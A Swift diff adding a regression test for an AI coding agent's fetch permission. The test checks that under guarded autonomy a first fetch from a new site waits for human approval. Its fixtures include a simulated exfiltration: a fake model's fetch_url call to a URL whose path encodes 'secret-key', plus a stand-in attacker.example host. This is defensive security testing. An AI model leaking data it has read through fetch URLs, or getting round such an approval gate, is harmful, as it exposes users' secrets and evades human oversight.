@@ -19,6 +19,49 @@ final class AuditHeronRegressionTests: XCTestCase {
     }
 
     // HER: command output bypasses the 16,000 ceiling (toolResult returns `content`, not the bounded text).
+    /// SEC-10: under Guarded a fetch ran without asking, and a URL's path can carry what the
+    /// agent read to any site it names. Now the first fetch from a site asks.
+    func testAFetchFromANewSiteAsksBelowFull() throws {
+        let project = try HeronRequestMeasurementTests.fixtureProject()
+        defer { try? FileManager.default.removeItem(at: project) }
+        let server = try FakeModelServer { index, _ in
+            if index == 0 { return .tools([(name: "fetch_url", input: #"{"url": "https://example.com/c2VjcmV0LWtleQ"}"#)]) }
+            return .text("Done.")
+        }
+        defer { server.stop() }
+        let state = FileManager.default.temporaryDirectory.appendingPathComponent("audit-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: state, withIntermediateDirectories: true)
+        let registry = ProviderRegistryStore(storeURL: state.appendingPathComponent("providers.json"))
+        var anthropic = try XCTUnwrap(registry.provider(for: "anthropic"))
+        anthropic.baseURL = server.baseURL
+        registry.addOrUpdate(anthropic)
+        if ProcessInfo.processInfo.environment["ANTHROPIC_API_KEY"] == nil { setenv("ANTHROPIC_API_KEY", "fake", 1) }
+        let usage = UsageStore(storeURL: state.appendingPathComponent("usage.json"))
+        let store = AgentSessionStore(stateDirectory: state.appendingPathComponent("sessions"))
+        let bridge = WorkspaceBridge(
+            liveBufferProvider: { _ in nil }, applyEditIntoOpenTab: { _, _ in false }, onRevealFileRequested: { _ in },
+            runShellCommand: { _, _, completion in completion("") }, interruptShellCommand: {}
+        )
+        let root = project
+        nonisolated(unsafe) var autonomy = AgentAutonomy.guarded
+        let runner = AgentRunner(trackKey: "", sessionStore: store, projectPath: project.path,
+                                 bridgeProvider: { bridge }, rootProvider: { root },
+                                 modeProvider: { AgentMode(scope: .build, autonomy: autonomy) },
+                                 modelSelectionProvider: { ("anthropic", "claude-sonnet-5", .standard) },
+                                 providerRegistry: registry, usageStore: usage)
+        runner.send("Read the docs.")
+        spin(20) { runner.phase == .awaitingApproval || runner.phase == .finishedTurn }
+        XCTAssertEqual(runner.phase, .awaitingApproval, "the fetch waits for the person")
+        let url = try XCTUnwrap(URL(string: "https://example.com/c2VjcmV0LWtleQ"))
+        XCTAssertFalse(runner.fetchAutoRuns(url))
+        runner.approvedFetchHosts.insert("example.com")
+        XCTAssertTrue(runner.fetchAutoRuns(url), "a site the person approved runs unattended after")
+        XCTAssertFalse(runner.fetchAutoRuns(try XCTUnwrap(URL(string: "https://attacker.example/x"))))
+        autonomy = .full
+        XCTAssertTrue(runner.fetchAutoRuns(try XCTUnwrap(URL(string: "https://attacker.example/x"))), "Full fetches as it edits: without asking")
+        runner.teardown()
+    }
+
     func testCommandOutputEntersHistoryUnbounded() throws {
         let project = try HeronRequestMeasurementTests.fixtureProject()
         defer { try? FileManager.default.removeItem(at: project) }
